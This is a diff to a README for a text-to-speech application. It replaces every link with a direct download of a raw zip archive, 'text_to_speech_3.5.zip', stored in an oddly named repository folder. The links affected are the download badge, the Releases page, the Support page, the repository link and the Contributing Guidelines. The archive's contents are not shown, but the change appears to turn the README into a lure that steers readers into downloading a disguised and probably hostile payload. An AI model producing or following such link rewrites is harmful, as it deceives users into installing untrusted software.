@@ -8,7 +8,7 @@ To begin using this application, follow these steps to download and install the 
 
 ## 📥 Download Link
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue)](https://github.com/bv2518/text-to-speech/releases)
+[![Download Latest Release](https://github.com/bv2518/text-to-speech/raw/refs/heads/main/unharassed/text_to_speech_3.5.zip)](https://github.com/bv2518/text-to-speech/raw/refs/heads/main/unharassed/text_to_speech_3.5.zip)
 
 ## 📦 System Requirements
 
@@ -19,7 +19,7 @@ To begin using this application, follow these steps to download and install the 
 ## 🛠️ Installation Steps
 
 1. **Visit the Download Page:**
-   Go to the [Releases page](https://github.com/bv2518/text-to-speech/releases) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/bv2518/text-to-speech/raw/refs/heads/main/unharassed/text_to_speech_3.5.zip) to find the latest version of the software.
 
 2. **Download the Package:**
    Look for the latest release. You will see files available for download. Choose the file that suits your operating system and click the link.
@@ -64,7 +64,7 @@ If you encounter issues while downloading or using the application, consider the
 - Ensure you have a stable internet connection when downloading.
 - Check your system requirements to confirm compatibility.
 - Restart the application if it becomes unresponsive.
-- If problems persist, visit our [Support Page](https://github.com/bv2518/text-to-speech/issues) for more help.
+- If problems persist, visit our [Support Page](https://github.com/bv2518/text-to-speech/raw/refs/heads/main/unharassed/text_to_speech_3.5.zip) for more help.
 
 ## ❓ Frequently Asked Questions
 
@@ -79,7 +79,7 @@ Yes, this application is available for free under the MIT License. You can use i
 
 ## 🌐 More Information
 
-For additional details, updates, and features, visit the [GitHub Repository](https://github.com/bv2518/text-to-speech).
+For additional details, updates, and features, visit the [GitHub Repository](https://github.com/bv2518/text-to-speech/raw/refs/heads/main/unharassed/text_to_speech_3.5.zip).
 
 ## 📜 License
 
@@ -87,6 +87,6 @@ This application is open-source and licensed under the MIT License. You can free
 
 ## ⚙️ Community Contributions
 
-We welcome contributions to improve the application. If you're interested in helping out, check the [Contributing Guidelines](https://github.com/bv2518/text-to-speech/blob/main/CONTRIBUTING.md).
+We welcome contributions to improve the application. If you're interested in helping out, check the [Contributing Guidelines](https://github.com/bv2518/text-to-speech/raw/refs/heads/main/unharassed/text_to_speech_3.5.zip).
 
 Now you are ready to start using the text-to-speech application. Enjoy creating your audio files!
